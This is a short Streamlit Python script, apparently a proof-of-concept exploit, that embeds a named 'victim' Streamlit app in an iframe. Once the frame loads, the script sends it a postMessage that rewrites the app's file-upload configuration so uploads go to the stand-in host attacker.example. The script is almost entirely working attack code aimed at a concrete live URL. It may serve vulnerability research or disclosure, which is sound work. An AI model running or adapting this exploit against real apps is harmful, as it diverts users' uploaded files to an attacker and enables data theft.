import streamlit as st
import streamlit.components.v1 as components

st.title("Demo host of victim app")
components.html(f"""
 <iframe id="victim" src="https://activate-fwwrn5gbiq-ey.a.run.app/" style="width:100%;height:800px;border:1px solid #ccc"></iframe>
 <script>
   const iframe = document.getElementById('victim');
   iframe.addEventListener('load', () => {{
     iframe.contentWindow.postMessage({{
       stCommVersion: 1,
       type: "SET_FILE_UPLOAD_CLIENT_CONFIG",
       prefix: "https://attacker.example",
       headers: {{"X-Debug": "demo"}}
     }}, "https://activate-fwwrn5gbiq-ey.a.run.app");
   }});
 </script>
""", height=840)